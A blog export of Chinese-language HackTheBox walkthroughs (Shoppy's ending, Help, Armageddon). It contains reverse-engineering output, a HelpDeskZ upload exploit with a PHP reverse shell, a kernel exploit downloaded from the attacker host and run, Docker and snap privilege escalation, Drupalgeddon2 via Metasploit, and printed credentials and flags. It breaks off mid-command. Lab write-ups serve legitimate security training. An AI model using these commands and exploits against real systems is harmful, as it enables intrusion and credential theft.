sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_ │ 0x00001249 488d45c0 lea rax, [var_40h] │ 0x0000124d 4889c7 mov rdi, rax │ 0x00001250 e87bfeffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::basic_string() ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string__ │ 0x00001255 488d45c0 lea rax, [var_40h] │ 0x00001259 4889c6 mov rsi, rax │ 0x0000125c 488d3d7d2f00. lea rdi, obj.std::cin ; 0x41e0 │ 0x00001263 e848feffff call sym std::basic_istream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&gt;&gt;&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;(std::basic_istream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;&amp;) ; sym.imp.std::basic_istream_char__std::char_traits_char____std::operator___char__std::char_traits_char___std::allocator_char____std::basic_istream_char__std::char_traits_char_____std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____ │ 0x00001268 488d45ef lea rax, [var_11h] │ 0x0000126c 4889c7 mov rdi, rax │ 0x0000126f e88cfeffff call sym std::allocator&lt;char&gt;::allocator() ; sym.imp.std::allocator_char_::allocator__ │ 0x00001274 488d55ef lea rdx, [var_11h] │ 0x00001278 488d45a0 lea rax, [var_60h] │ 0x0000127c 488d35d90d00. lea rsi, [0x0000205c] │ 0x00001283 4889c7 mov rdi, rax │ 0x00001286 e835feffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::basic_string(char const*, std::allocator&lt;char&gt; const&amp;) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string_char_const__std::allocator_char__const_ │ 0x0000128b 488d45ef lea rax, [var_11h] │ 0x0000128f 4889c7 mov rdi, rax │ 0x00001292 e809feffff call fcn.000010a0 │ 0x00001297 488d45a0 lea rax, [var_60h] │ 0x0000129b 488d35bb0d00. lea rsi, str.Sample ; 0x205d ; u&quot;Sample&quot; │ 0x000012a2 4889c7 mov rdi, rax │ 0x000012a5 e8c6fdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ │ 0x000012aa 488d45a0 lea rax, [var_60h] │ 0x000012ae 488d35aa0d00. lea rsi, [0x0000205f] ; u&quot;ample&quot; │ 0x000012b5 4889c7 mov rdi, rax │ 0x000012b8 e8b3fdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ │ 0x000012bd 488d45a0 lea rax, [var_60h] │ 0x000012c1 488d35990d00. lea rsi, [0x00002061] ; u&quot;mple&quot; │ 0x000012c8 4889c7 mov rdi, rax │ 0x000012cb e8a0fdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ │ 0x000012d0 488d45a0 lea rax, [var_60h] │ 0x000012d4 488d35880d00. lea rsi, [0x00002063] ; u&quot;ple&quot; │ 0x000012db 4889c7 mov rdi, rax │ 0x000012de e88dfdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ │ 0x000012e3 488d45a0 lea rax, [var_60h] │ 0x000012e7 488d35770d00. lea rsi, [0x00002065] ; u&quot;le&quot; │ 0x000012ee 4889c7 mov rdi, rax │ 0x000012f1 e87afdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ │ 0x000012f6 488d45a0 lea rax, [var_60h] │ 0x000012fa 488d35660d00. lea rsi, [0x00002067] ; &quot;e&quot; │ 0x00001301 4889c7 mov rdi, rax │ 0x00001304 e867fdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ │ 0x00001309 488d55a0 lea rdx, [var_60h] │ 0x0000130d 488d45c0 lea rax, [var_40h] │ 0x00001311 4889d6 mov rsi, rdx │ 0x00001314 4889c7 mov rdi, rax │ 0x00001317 e814fdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::compare(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;) const ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::compare_std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____const__const │ 0x0000131c 85c0 test eax, eax │ 0x0000131e 0f94c0 sete al │ 0x00001321 84c0 test al, al │ ┌─&lt; 0x00001323 743b je 0x1360 │ │ 0x00001325 488d35440d00. lea rsi, str.Access_granted__Here_is_creds__ ; 0x2070 ; &quot;Access granted! Here is creds !&quot; │ │ 0x0000132c 488d3d8d2d00. lea rdi, obj.std::cout ; sym..bss │ │ ; 0x40c0 │ │ 0x00001333 e848fdffff call sym std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_ │ │ 0x00001338 4889c2 mov rdx, rax │ │ 0x0000133b 488b058e2c00. mov rax, qword [method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____] ; [0x3fd0:8]=0 │ │ 0x00001342 4889c6 mov rsi, rax │ │ 0x00001345 4889d7 mov rdi, rdx │ │ 0x00001348 e843fdffff call sym std::ostream::operator&lt;&lt;(std::ostream&amp; (*)(std::ostream&amp;)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__ │ │ 0x0000134d 488d3d3c0d00. lea rdi, str.cat__home_deploy_creds.txt ; 0x2090 ; &quot;cat /home/deploy/creds.txt&quot; ; const char *string │ │ 0x00001354 e8f7fcffff call sym.imp.system ; int system(const char *string) │ │ 0x00001359 bb00000000 mov ebx, 0 │ ┌──&lt; 0x0000135e eb2d jmp 0x138d │ ││ ; CODE XREF from main @ 0x1323 │ │└─&gt; 0x00001360 488d35490d00. lea rsi, str.Access_denied__This_incident_will_be_reported__ ; 0x20b0 ; &quot;Access denied! This incident will be reported !&quot; │ │ 0x00001367 488d3d522d00. lea rdi, obj.std::cout ; sym..bss │ │ ; 0x40c0 │ │ 0x0000136e e80dfdffff call sym std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_ │ │ 0x00001373 4889c2 mov rdx, rax │ │ 0x00001376 488b05532c00. mov rax, qword [method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____] ; [0x3fd0:8]=0 │ │ 0x0000137d 4889c6 mov rsi, rax │ │ 0x00001380 4889d7 mov rdi, rdx │ │ 0x00001383 e808fdffff call sym std::ostream::operator&lt;&lt;(std::ostream&amp; (*)(std::ostream&amp;)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__ │ │ 0x00001388 bb01000000 mov ebx, 1 │ │ ; CODE XREF from main @ 0x135e │ └──&gt; 0x0000138d 488d45a0 lea rax, [var_60h] │ 0x00001391 4889c7 mov rdi, rax │ 0x00001394 e8a7fcffff call fcn.00001040 │ 0x00001399 488d45c0 lea rax, [var_40h] │ 0x0000139d 4889c7 mov rdi, rax │ 0x000013a0 e89bfcffff call fcn.00001040 │ 0x000013a5 89d8 mov eax, ebx │ ┌─&lt; 0x000013a7 eb3c jmp 0x13e5 .. │││ ; CODE XREFS from main @ +0x1b3, +0x1c4 │ │ ; CODE XREF from main @ 0x13a7 │ └─&gt; 0x000013e5 488b5df8 mov rbx, qword [var_8h] │ 0x000013e9 c9 leave └ 0x000013ea c3 ret 使用函数 s main 定位到 main 函数的地址，使用函数 pdf 查看当前函数的汇编代码 0x0000120e 488d35fb0d00. lea rsi, str.Welcome_to_Josh_password_manager_ ; 0x2010 ; &quot;Welcome to Josh password manager!&quot; 这是一个 c++ 写的程序，运行程序之后会输出 “Welcome to Josh password manager!” 字符串 0x00001236 488d35fb0d00. lea rsi, str.Please_enter_your_master_password:_ ; 0x2038 ; &quot;Please enter your master password: &quot; 然后输出 “Please enter your master password: “ 字符串，并接受我们的输入 │ 0x0000129b 488d35bb0d00. lea rsi, str.Sample ; 0x205d ; u&quot;Sample&quot; │ 0x000012a2 4889c7 mov rdi, rax │ 0x000012a5 e8c6fdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ │ 0x000012aa 488d45a0 lea rax, [var_60h] │ 0x000012ae 488d35aa0d00. lea rsi, [0x0000205f] ; u&quot;ample&quot; │ 0x000012b5 4889c7 mov rdi, rax │ 0x000012b8 e8b3fdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ │ 0x000012bd 488d45a0 lea rax, [var_60h] │ 0x000012c1 488d35990d00. lea rsi, [0x00002061] ; u&quot;mple&quot; │ 0x000012c8 4889c7 mov rdi, rax │ 0x000012cb e8a0fdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ │ 0x000012d0 488d45a0 lea rax, [var_60h] │ 0x000012d4 488d35880d00. lea rsi, [0x00002063] ; u&quot;ple&quot; │ 0x000012db 4889c7 mov rdi, rax │ 0x000012de e88dfdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ │ 0x000012e3 488d45a0 lea rax, [var_60h] │ 0x000012e7 488d35770d00. lea rsi, [0x00002065] ; u&quot;le&quot; │ 0x000012ee 4889c7 mov rdi, rax │ 0x000012f1 e87afdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ │ 0x000012f6 488d45a0 lea rax, [var_60h] │ 0x000012fa 488d35660d00. lea rsi, [0x00002067] ; &quot;e&quot; │ 0x00001301 4889c7 mov rdi, rax │ 0x00001304 e867fdffff call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ 接着，程序会和我们输入的字符串和 Sample 字符一个一个的做对比 0x00001325 488d35440d00. lea rsi, str.Access_granted__Here_is_creds__ ; 0x2070 ; &quot;Access granted! Here is creds !&quot; 0x0000134d 488d3d3c0d00. lea rdi, str.cat__home_deploy_creds.txt ; 0x2090 ; &quot;cat /home/deploy/creds.txt&quot; ; const char *string 我们输入的字符串是 Sample 后，会输出 “Access granted! Here is creds !” 字符串，表示我们输入正确，然后会执行一个系统命令 “cat &#x2F;home&#x2F;deploy&#x2F;creds.txt”，查看文件 &#x2F;home&#x2F;deploy&#x2F;creds.txt 的内容。 现在我们回到靶机，来执行一下 jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager [sudo] password for jaeger: Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! 得到了一个账号密码，然后使用这个账号密码切换到用户 deploy jaeger@shoppy:/home/deploy$ su deploy Password: $ whoami&amp;&amp;id deploy uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker) 成功提权到 deploy 用户 Docker 越权 https://gtfobins.github.io/gtfobins/docker/ 查询提权帮助 我们尝试一下是否可行 docker run -v /:/mnt --rm -it alpine chroot /mnt sh $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo) 成功越权到 root 权限 # cat /root/root.txt e95c041905b2bb2a8fcbb6d9327e9d64 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Help - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Help","date":"2022-09-05T11:38:36.000Z","updated":"2023-06-13T03:44:51.000Z","comments":true,"path":"2022/09/05/Hackthebox/Easy/Hackthebox-Help/","link":"","permalink":"http://www.lucifiel.com/2022/09/05/Hackthebox/Easy/Hackthebox-Help/","excerpt":"","text":"Hackthebox - Help靶场信息 靶场类型 信息收集Nmap┌──(root㉿lucifiel)-[~/Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.121 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 09:14 CST Nmap scan report for 10.10.10.121 Host is up (0.35s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA) | 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA) |_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-title: Did not follow redirect to http://help.htb/ |_http-server-header: Apache/2.4.18 (Ubuntu) 3000/tcp open http Node.js Express framework |_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8). Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), DD-WRT (Linux 3.18) (93%), Linux 4.10 (93%), Linux 4.2 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1720/tcp) HOP RTT ADDRESS 1 349.63 ms 10.10.14.1 2 349.25 ms 10.10.10.121 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.59 seconds Http 直接访问会被跳转到 htlp.htb 去加一个 hosts echo 10.10.10.121 help.htb &gt;&gt; /etc/hosts 现在可以访问了，不过是 apache2 的默认界面，去 fuzz 一下 Fuzz┌──(root㉿lucifiel)-[~/Desktop] └─# gobuster dir -u http://help.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://help.htb/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/09/04 20:36:06 Starting gobuster in directory enumeration mode =============================================================== /javascript (Status: 301) [Size: 309] [--&gt; http://help.htb/javascript/] /support (Status: 301) [Size: 306] [--&gt; http://help.htb/support/] /server-status (Status: 403) [Size: 296] =============================================================== 2022/09/04 20:37:41 Finished =============================================================== 有一个 support 目录，访问一下 是一个登录页面，并且可以确定框架为 helpdeskz ┌──(root㉿lucifiel)-[~/Desktop] └─# searchsploit helpdeskz ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- HelpDeskZ 1.0.2 - Arbitrary File Upload | php/webapps/40300.py HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download | php/webapps/41200.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 可以看到有两个漏洞，分别是 1.0.2 版本的任意文件上传以及 1.0.2 版本以下的 sql 注入，但是我们无法确定当前 cms 的版本号 ┌──(root㉿lucifiel)-[~/Desktop] └─# curl http://help.htb/support/README.md {% image Hackthebox-Help//images/logo.png '' '' %} Version: 1.0.2 from 1st June 2015&lt;br&gt; Developed by: Evolution Script S.A.C.&lt;br&gt; [Help Desk Software HelpDeskZ](http://www.helpdeskz.com) HelpDeskZ is a free PHP based software which allows you to manage your site&#39;s support with a web-based support ticket system. ## Requirements HelpDeskZ requires: - PHP 5.x - MySQL database - GD Library (only for captcha verification) - Mod_rewrite (only if you want to use permalinks)- ## Upgrading To upgrade your HelpDeskZ from previous versions, please read the file UPGRADING.txt ## Installation steps - Connect with FTP to the &lt;em&gt;public folder&lt;/em&gt; of your server where the rest of your Web site is - Create a new folder where you will install HelpDeskZ. Name it anything you like, for example &quot;helpdesk&quot; or &quot;support&quot;.&lt;br&gt; Example: /public_html/support&lt;br&gt; Corresponding URL: http://www.site.com/support - Upload all HelpDeskZ files to your server. - Open **/install** in your browser, for example (modify to your URL):&lt;br /&gt; http://www.site.com/support/install - The HelpDeskZ setup script will run. Click &lt;strong&gt;INSTALL HELPDESKZ&lt;/strong&gt; and follow the instructions through License agreement, Check Setup and Database settings. - Before closing the install script **DELETE the &quot;install&quot; directory from your server!** - Now it&#39;s time to setup your help desk! Open the &lt;strong&gt;staff&lt;/strong&gt; panel in your browser, for example:&lt;br /&gt; http://www.site.com/support/?v=staff&lt;br /&gt; Use the login details that you entered in the installation process. - Go to &lt;strong&gt;Settings -&gt; General&lt;/strong&gt; to get to the settings page. - Take some time and get familiar with all of the available settings. Most of them should be self-explanatory. - If you want to use permalinks like http://www.site.com/support/staff/ then you have to enable this option on Settings -&gt; General -&gt; Helpdesk -&gt; Use SEO-friendly URLs - Good luck using HelpDeskZ! - ## Email Piping HelpDeskZ supports email piping, this allows the auto-creation of tickets from incoming emails to a set email address. - To enable email piping for your help desk follow this &lt;a href=&quot;http://www.helpdeskz.com/help/knowledgebase/2/article/10/setting-up-email-piping&quot;&gt;email piping tutorial.&lt;/a&gt; ## Customize the look For detailed information please see this &lt;a href=&quot;http://www.helpdeskz.com/help/knowledgebase/2/article/6/how-do-i-customize-helpdeskz-look&quot;&gt;knowledgebase article.&lt;/a&gt; ## Translate HelpDeskZ to your language To translate HelpDeskZ read &lt;a href=&quot;http://www.helpdeskz.com/help/knowledgebase/2/article/8/how-can-i-translate-helpdeskz&quot;&gt;How can I translate HelpDeskZ.&lt;/a&gt; 通过 README.md 得知当前版本为 1.0.2 根据漏洞，当前应该是可以直接进行 sql 注入尝试的，不过咱们再看看更多思路 3000 端口 这边有个 3000 端口可以访问 &quot;Hi Shiv, To get access please find the credentials with given query&quot; 这提示我们，想要获得权限，需要通过给定的查询找到答案 ┌──(root㉿lucifiel)-[~/Desktop] └─# dirsearch -u &quot;http://10.10.10.121:3000&quot; _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927 Output File: /root/.dirsearch/reports/10.10.10.121-3000/_22-07-01_09-29-39.txt Error Log: /root/.dirsearch/logs/errors-22-07-01_09-29-39.log Target: http://10.10.10.121:3000/ [09:29:40] Starting: [09:33:40] 400 - 18B - /graphql/ [09:33:40] 400 - 18B - /graphql/console/ [09:33:40] 400 - 18B - /graphql Task Completed 找到了一个 &#x2F;graphql 目录，这个目录下还有一个 &#x2F;console 目录，去访问一下 这边提示需要一个 get 参数 query 随便加一个参数后倒是出来数据了，但是提示语法错误，去找一下query相关的功能 找到相关的利用方式，然后读取到了一个账号密码 漏洞利用 得到解密后的账号密码 username = helpme@helpme.com password = godhelpmeplz 在 80 端口成功登录 把时区修改为我们当前环境的时区 在 Submit a Ticket 中尝试上传一个 php 文件 这里提示上传失败，但是其实是成功的，不过会被修改为随机文件名，找到就可以了，所以我们还是去利用脚本吧 ┌──(root㉿lucifiel)-[~/Desktop] └─# python2 40300.py http://help.htb/support/uploads/tickets/ 1.php Helpdeskz v1.0.2 - Unauthenticated shell upload exploit found! http://help.htb/support/uploads/tickets/9d831815c3faa6a961d01bd9dc543aca.php 上传成功，去尝试访问看看 成功上传并且访问成功，去制作一个 php 的 revershell https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php 然后去网页端上传，接着使用 nc 监听一个端口，然后运行 exploit ┌──(root㉿lucifiel)-[~/Desktop] └─# python2 40300.py http://help.htb/support/uploads/tickets/ phpshell.php Helpdeskz v1.0.2 - Unauthenticated shell upload exploit ┌──(root㉿lucifiel)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.10.121] 35558 Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 19:41:30 up 1 day, 9:53, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare) /bin/sh: 0: can&#39;t access tty; job control turned off $ python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; help@help:/$ id&amp;&amp;whoami id&amp;&amp;whoami uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare) help 成功弹回 shel cat user.txt 64cf57c35b4e6991534e125790ad0b55 成功拿到 user 权限的 flag 文件 权限提升首先使用 python 开启一个 http 服务器，然后上传一个 linpeas 提权辅助脚本 ╔═══════════════════╗ ═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════ ╚═══════════════════╝ OS: Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 User &amp; Groups: uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare) Hostname: help Writable folder: /dev/shm [+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h) [+] /bin/nc is available for network discover &amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h) Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE 这边看到了系统版本是 ubuntu 4.40，去搜索下是否有漏洞 ┌──(root㉿lucifiel)-[~/Desktop] └─# searchsploit 4.4.0-116 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation | linux/local/44298.c ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 找到一个 传到服务器去，然后编译运行 help@help:/tmp$ wget http://10.10.14.9/44298.c wget http://10.10.14.9/44298.c --2022-09-04 20:40:43-- http://10.10.14.9/44298.c Connecting to 10.10.14.9:80... connected. HTTP request sent, awaiting response... 200 OK Length: 5773 (5.6K) [text/x-csrc] Saving to: &#39;44298.c&#39; 44298.c 100%[===================&gt;] 5.64K --.-KB/s in 0s 2022-09-04 20:40:43 (20.3 MB/s) - &#39;44298.c&#39; saved [5773/5773] 传输进来以后，去进行编译 help@help:/tmp$ gcc 44298.c -o exploit gcc 44298.c -o exploit 接着运行 help@help:/tmp$ ./exploit ./exploit task_struct = ffff880037ee8000 uidptr = ffff880036f91084 spawning root shell root@help:/tmp# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help) root@help:/root# cat root.txt cat root.txt 9123b571740b6f2c3b1a7fa657c55f20 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Armageddon - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Armageddon","date":"2022-08-04T03:14:26.000Z","updated":"2023-06-13T03:39:50.000Z","comments":true,"path":"2022/08/04/Hackthebox/Easy/Hackthebox-Armageddon/","link":"","permalink":"http://www.lucifiel.com/2022/08/04/Hackthebox/Easy/Hackthebox-Armageddon/","excerpt":"","text":"靶场信息 靶场类型 信息搜集NMAP首先使用 nmap 进行扫描 nmap –A -sS –sC –Sv 10.10.10.233 我们可以看到开启了22和80端口 在 80 端口提示了我们存在 robots.txt 文件，并且东西很多 咱们访问一下 其中引起我兴趣的东西呢就是 /MAINTAINERS.txt 文件了 这是维护文件，或者说是升级文件，咱们打开看一下 果不其然，里面揭露了Drupal的版本 到这里思路就明了了 漏洞利用咱们直接使用 msf 进行 getshell 使用 msfconsole 打开 msf 输入search drupal搜索可用的exp 咱们对比一下版本号，最后一次升级为7.56版本，升级时间为2017-06-21 也就是说在这之前的exp都可以直接pass了 咱们把目光放在 2018-03-28的exp 上 use exploit/unix/webapp/drupal_drupalgeddon2 option set RHOSTS 10.10.10.233 set lhost 10.10.14.135 exploit 成功获取到一个shell 咱们运行一下无法查看到uid，但是可以查看到文件 但我偏不，我就想知道当前用户怎么办？ 简单 输入 shell 一开始我以为是卡住了，但后来想想不对，好像是获取到了 执行命令后确认命令是可以被执行的？ 那咱们先想办法获得一个稳定的shell吧 /bin/bash –i 不一样被我搞到shell了，可给我NB坏了，叉会儿腰 用户是apache，权限还是有点低啊，咱们在内核里看到了一个域名，或许有用，先记录下来吧，暂时还不知道是干嘛的，咱们得想想办法去搞到更高一点的权限 我在查看源码和配置文件的时候，在 ..&#x2F;sites&#x2F;default&#x2F;settings.php 中找到了数据库的账号密码 database =&gt; drupal username =&gt; drupaluser password =&gt; CQHEy@9M*m23gBVj 他不是开启了22端口吗，咱们直接ssh登录吧 嗯？密码不对？啊这，就有点尴尬了呀 没事儿，咱们换一种方法，既然从外面来不行，那咱们就从里面来，咳咳 没开车哈 请不要脑补 在咱们的 shell 里直接使用 mysql 进行登录 很奇怪，正常输入账号密码会卡住或者报错或者出现一些奇怪的东西 经过多方测试以及查找资料后，得出正确的查询命令 mysql -u &quot;drupaluser&quot; -h &quot;localhost&quot; &quot;-pCQHEy@9M*m23gBVj&quot; &quot;drupal&quot; -e &quot;select uid, name, pass from users;&quot; brucetherealadmin 账户一看这么长就知道不简单，俗话说的好，长的人一定不简单，咋办？爆它！ 将用户 brucetherealadmin 的 hash 保存为一个文本文件 请出我们的神器john john --wordlist=/usr/share/wordlists/rockyou.txt admin 爆破成功 密码为 booboo 现在咱们直接ssh登录就可以了 ssh brucetherealadmin@10.10.10.233 OK，咱们现在总算是有一个完整的用户权限了 成功获得user权限的flag 权限提升 咱们使用 sudo –l 来查看一下 sudo 权限 咱们可以不使用密码就调用 root 权限安装 snap，那思路就有了呀，搞起来兄弟们 生成一个snap的马 参考链接： Privilege Escalation in Ubuntu Linux (dirty_sockv2 exploit)：https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html Playing with Dirty Sock：https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html 生成指令： python2 -c 